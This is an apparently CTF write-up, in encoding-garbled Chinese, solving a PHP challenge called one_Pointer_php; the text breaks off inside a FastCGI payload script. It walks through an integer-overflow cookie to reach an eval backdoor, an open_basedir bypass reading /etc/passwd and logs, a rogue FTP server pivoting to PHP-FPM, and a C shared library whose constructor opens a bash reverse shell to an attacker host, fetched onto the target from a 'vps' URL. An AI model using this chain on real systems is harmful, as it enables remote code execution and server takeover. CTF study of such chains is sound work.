        <content type="html"><![CDATA[<p>æ€ä¹ˆè¯´å‘¢ï¼Œæ¯”èµ›å®‰æ’åœ¨å‘¨å››ï¼Œæ²¡å•¥æ—¶é—´æ‰“ï¼Œé˜Ÿå‹ä»¬éƒ½ä¸Šè¯¾å»äº†ï¼Œæˆ‘å¯å®¤ä¹Ÿæœ‰äº‹æƒ…ï¼Œæ‰€ä»¥è¿™æ¬¡æ¯”èµ›å°±è¿™æ ·äº†ï¼Œæ‰“å¾—ä¸å¥½ï¼Œä½†æ˜¯èµ›åè¿˜æ˜¯è¦å¤ç°ä¸€ä¸‹ã€‚</p><h2 id="web1-Ball-sigin"><a href="#web1-Ball-sigin" class="headerlink" title="web1 Ball_sigin"></a>web1 Ball_sigin</h2><p>ç­¾åˆ°é¢˜ï¼Œjs æ¸¸æˆï¼Œæ²¡çœ‹ã€‚</p><p>çœŸçš„æ˜¯ç©æ¸¸æˆï¼Œæ²¡äº‹äº†ã€‚</p><h2 id="web2-one-Pointer-php"><a href="#web2-one-Pointer-php" class="headerlink" title="web2 one_Pointer_php"></a>web2 one_Pointer_php</h2><p>phpï¼Œæœ€ç»ˆç›®çš„ disable_functionï¼Œä¸ä¼šï¼Œç­‰ä¸€æ³¢èµ›å WP å¤ç°äº†ã€‚</p><p><code>user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>add_api.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°æˆ‘ä»¬éœ€è¦æ‰§è¡Œ evalï¼Œä½†æ˜¯æˆ‘ä»¬å…ˆè¦ä½¿ <code>$count=1</code> è¿”å›ä¸€ä¸ª falseï¼Œæ€æ ·æ‰èƒ½è®©ä¸€ä¸ªä¸æ˜¯èµ‹ 0 çš„èµ‹å€¼è¯­å¥è¿”å› false å‘¢â€¦â€¦</p><p>æƒ³åˆ°äº†æº¢å‡ºï¼Œå…³äº <code>$count[]=1</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™æ ·ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼š</p><p><img src="http://i.loli.net/2021/04/29/IetDslwnc62dPm5.png"></p><p>å¯ä»¥è§‚å¯Ÿåˆ° <code>$count[]=2</code>ï¼Œä¼šæ•°ç»„çš„ä»æœ€åä¸€ä½ä½ç½®å‘å addï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬ä½¿ç”¨ php max long çš„è¯ï¼Œåº”è¯¥å¯ä»¥ä½¿è¿”å›å‡ºç°é—®é¢˜ä»è€Œç»•è¿‡ <code>if($count[]=1)</code></p><p><img src="https://i.loli.net/2021/04/29/wtO6uyTjIdQS84C.png"></p><p>å¯ä»¥å‘ç°ç¡®å®æŠ¥é”™äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¼€å§‹ eval äº†ï¼Œæ„é€  dataï¼š</p><p><code>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</code></p><p><img src="https://i.loli.net/2021/04/29/YEx4eDXmy8AbfrL.png"></p><p>successï¼Œokï¼Œçœ‹çœ‹ <code>disable_function</code> å§ï¼š</p><p><img src="https://i.loli.net/2021/04/29/LCEiHt2A3NUDTsP.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_classes: Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</span><br><span class="line">disable_functions: stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br></pre></td></tr></table></figure><p>å¥½ç‹ ï¼Œä¹‹å‰ @LemonPrefect å¸ˆå‚…å’ŒğŸ‘´è¯´ä»–è§‰å¾—å¯ä»¥è¯•è¯•åå°„ç±»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ReflectionClass(system(<span class="string">&#x27;calc&#x27;</span>)()) ;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$a</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ <code>disable_classes</code> é‡Œé¢æŠŠèƒ½å°çš„éƒ½å°äº†ï¼Œæ‰€ä»¥æ²¡åŠæ³•ï¼Œåªèƒ½ç»• df äº†ï¼Œå®³ï¼Œä¸ä¼šäº†ã€‚</p><p>å¯ä»¥é€šè¿‡ <code>DirectoryIterator</code> åˆ—å‡ºç›®å½•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123; <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>); &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/30/3geAkJQvWsECufP.png"></p><p>å¾ˆç¥å¥‡çš„æ˜¯æƒ³è¦åˆ—å‡º /tmp çš„æ—¶å€™å¦‚æœä¸ç”¨å½¢å¦‚ <code>$a=new DirectoryIterator(&quot;glob:///*mp/*&quot;);foreach($a as $f)&#123; echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;); &#125;</code> è¿™æ ·å­ï¼Œè€Œæ˜¯ç›´æ¥ /tmp çš„è¯ä¼šè¯»ä¸å‡ºï¼ˆä¸è§£ï¼‰</p><p><img src="https://i.loli.net/2021/05/03/9s7cSGupkoy3UmY.png"></p><p>æœ‰ <code>open_basedir</code>ï¼Œç»•ä¸€ä¸‹å¯ä»¥è¯»å–ä¸€äº›åŸºæœ¬æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/etc/passwd&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/30/WM2oOZxlL6GhHQ9.png"></p><p>flag è¯»ä¸äº†ï¼Œå‚è€ƒäº† <a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-5">@HA1C9ON</a> å¤§ä½¬çš„åšå®¢å‘ç°è¯»å– <code>php.ini</code> å¯ä»¥å‘ç° so æ–‡ä»¶ï¼Œä¸è¿‡ BUU é‡ŒæŠŠè¿™ä¸ªé¢„æœŸè§£åˆ æ‰äº†ï¼Œä½†æ˜¯è¿˜æœ‰åˆ«çš„æ–¹æ³•å¯ä»¥åšã€‚</p><p><img src="https://i.loli.net/2021/04/30/waLhi9n3coeWUAC.png"></p><p>æŸ¥çœ‹ phpinfo çŸ¥é“è¿›ç¨‹ä¸º php-fpmï¼ˆä¹Ÿå¯ä»¥é€šè¿‡ /proc/self/cmdline å¾—çŸ¥ï¼‰</p><p><img src="https://i.loli.net/2021/05/03/m5du2EQf8wChIx9.png"></p><p>è®¿é—®é”™è¯¯æ—¥å¿—ï¼Œå¾—åˆ° FPM ç›‘å¬ç«¯å£ 9001</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/var/log/nginx/error.log&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/03/uE8vCbDs5nw1oYl.png"></p><hr><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å‘ PHP-FPM æœåŠ¡å‘é€ä¸€ä¸ªä»»æ„çš„äºŒè¿›åˆ¶æ•°æ®åŒ…ï¼Œå°±å¯ä»¥åœ¨æœºå™¨ä¸Šæ‰§è¡Œä»£ç ã€‚è¿™ç§æŠ€æœ¯ç»å¸¸ä¸ gopher:// åè®®ç»“åˆä½¿ç”¨ï¼Œcurl æ”¯æŒ gopher:// åè®®ï¼Œä½† file_get_contents å´ä¸æ”¯æŒã€‚</p><p>å¦ä¸€ä¸ªå·²çŸ¥çš„å…è®¸é€šè¿‡TCPå‘é€äºŒè¿›åˆ¶æ•°æ®åŒ…çš„åè®®æ˜¯FTPï¼Œæ›´å‡†ç¡®çš„è¯´æ˜¯è¯¥åè®®çš„è¢«åŠ¨æ¨¡å¼ï¼Œå³ï¼šå¦‚æœä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾ä»FTPæœåŠ¡å™¨ä¸Šè¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼ˆæˆ–å†™å…¥ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–ï¼ˆæˆ–å†™ï¼‰åˆ°ä¸€ä¸ªç‰¹å®šçš„IPå’Œç«¯å£ä¸Šã€‚è€Œä¸”ï¼Œè¿™é‡Œå¯¹è¿™äº›IPå’Œç«¯å£æ²¡æœ‰è¿›è¡Œå¿…è¦çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘Šè¯‰å®¢æˆ·ç«¯è¿æ¥åˆ°è‡ªå·±çš„æŸä¸€ä¸ªç«¯å£ï¼Œå¦‚æœå®ƒæ„¿æ„çš„è¯ã€‚</p><p>ç°åœ¨ï¼Œç”±äºè¯¥ laravel æ¼æ´ä¸­file_get_contents()å’Œfile_put_contents()è¿™ä¸¤ä¸ªå‡½æ•°åœ¨ä½œç¥Ÿï¼Œå¦‚æœæˆ‘ä»¬å°è¯•ä½¿ç”¨ <code>viewFile=ftp://evil-server/file.txt</code> æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š</p><ul><li>file_get_contents()è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶ä¸‹è½½ file.txt</li><li>file_put_contents()è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶å°†å…¶ä¸Šä¼ å› file.txt</li></ul><p>ç°åœ¨ï¼Œä½ å¯èƒ½å·²ç»çŸ¥é“è¿™æ˜¯æ€ä¹ˆå›äº‹ï¼šæˆ‘ä»¬å°†ä½¿ç”¨FTPåè®®çš„è¢«åŠ¨æ¨¡å¼è®©file_get_contents()åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“å®ƒè¯•å›¾ä½¿ç”¨file_put_contents()æŠŠå®ƒä¸Šä¼ å›å»æ—¶ï¼Œæˆ‘ä»¬å°†å‘Šè¯‰å®ƒæŠŠæ–‡ä»¶å‘é€åˆ°127.0.0.1:9000ã€‚</p><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ç›®æ ‡ä¸»æœºæœ¬åœ°çš„PHP-FPMå‘é€ä¸€ä¸ªä»»æ„çš„æ•°æ®åŒ…ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œé€ æˆSSRFã€‚</p><hr><p>å¼•ç”¨è‡ª <a href="https://whoamianony.top/2021/01/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Laravel/Laravel%20Debug%20mode%20RCE%EF%BC%88CVE-2021-3129%EF%BC%89%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0/#%E5%88%A9%E7%94%A8FTP%E6%94%BB%E5%87%BBPHP-FPM">Laravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰æ¼æ´å¤ç°</a></p><p>å°è¯•åŠ è½½æ¶æ„ so æ–‡ä»¶ï¼Œç¼–å†™æ‰©å±•ï¼š</p><p><code>hpdoger.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xx.xx.xxx/11451 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>make</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è‡³ç›®æ ‡ /tmp ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">copy(<span class="string">&quot;http://vps/hpdoger.so&quot;</span>,<span class="string">&quot;/tmp/hpdoger.so&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç¼–å†™ python è„šæœ¬æ­å»ºæ¶æ„ ftp æœåŠ¡å™¨ï¼š</p><p><code>fuxk.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>åå°è¿è¡Œï¼š<code>python fuxk.py &amp;</code></p><p>ç„¶åå¼€å¯ç›‘å¬ï¼Œæ¥å—åå¼¹ shellï¼š<code>nc -lvp 11451</code></p><p>ç„¶åæ‰§è¡Œä¸€ä¸‹è„šæœ¬ç”Ÿæˆæ”»å‡» php-fpm æ‰€éœ€è¦çš„payloadï¼š</p><p><code>fastcgi.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span 